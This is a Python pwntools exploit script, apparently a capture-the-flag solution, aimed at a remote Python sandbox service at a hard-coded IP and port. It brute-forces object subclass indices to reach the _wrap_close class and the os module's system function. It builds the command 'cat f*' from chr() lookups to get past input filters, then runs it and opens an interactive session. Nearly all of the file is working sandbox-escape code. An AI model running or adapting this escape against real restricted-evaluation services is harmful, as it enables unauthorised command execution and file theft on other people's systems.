from pwn import *


def getResult(payload, final=False):
    print(f'{payload = }')
    r = remote('188.166.156.174', 30282)
    r.recvuntil('>>>')
    r.sendline(payload)
    if final:
        r.interactive()
    result = r.recvline().strip()
    r.close()
    return result


def getSubClass(index):
    return f'print.__class__.__base__.__subclasses__()[{index}]'


def getGlobals(index):
    wrapCloseFunc = getSubClass(findWrapCloseIndex())
    listFunc = getSubClass(findListIndex())
    return f'{wrapCloseFunc}.__init__.__globals__[{listFunc}({wrapCloseFunc}.__init__.__globals__.keys())[{index}]]'


def findSubClass(target):
    for i in range(0, 1337):
        print(f'Finding {target}:', i)
        if target == getResult(f'print({getSubClass(i)}.__name__)'):
            return i


def findGlobals(target):
    for i in range(0, 1337):
        print(f'Finding {target}:', i)
        result = getResult(f'print({getGlobals(i)}.__name__)')
        print(f'{result = }')
        if target == result:
            return i


def findWrapCloseIndex():
    if findWrapCloseIndex.foundIndex == None:
        findWrapCloseIndex.foundIndex = findSubClass(b'_wrap_close')
        print('Found wrapClose index:', findWrapCloseIndex.foundIndex)
    return findWrapCloseIndex.foundIndex


findWrapCloseIndex.foundIndex = 132


def findListIndex():
    if findListIndex.foundIndex == None:
        findListIndex.foundIndex = findSubClass(b'list')
        print('Found list index:', findListIndex.foundIndex)
    return findListIndex.foundIndex


findListIndex.foundIndex = 7


def findSystem():
    if findSystem.foundIndex == None:
        findSystem.foundIndex = findGlobals(b'system')
        print('Found list index:', findSystem.foundIndex)
    return findSystem.foundIndex


findSystem.foundIndex = 45
# Doesn't exist :(


def findInput():
    if findInput.foundIndex == None:
        findInput.foundIndex = findGlobals(b'input')
        print('Found list index:', findInput.foundIndex)
    return findInput.foundIndex


findInput.foundIndex = None

c = ord('c')
a = ord('a')
t = ord('t')
space = ord(' ')
f = ord('f')
asterix = ord('*')

chrexploit = 'print.__class__.__base__.__subclasses__()[7](print.__class__.__base__.__subclasses__()[7](print.__class__.__base__.__subclasses__()[132].__init__.__globals__.values())[7].values())[14]'

exploit = f'{getGlobals(findSystem())}({chrexploit}({c}) + {chrexploit}({a}) + {chrexploit}({t}) + {chrexploit}({space}) + {chrexploit}({f}) + {chrexploit}({asterix}))'
print(f'{exploit = }')
print(getResult(exploit, True))

# print.__class__.__base__.__subclasses__()[132].__init__.__globals__[print.__class__.__base__.__subclasses__()[7](print.__class__.__base__.__subclasses__()[132].__init__.__globals__.keys())[45]](chr(108) + chr(115))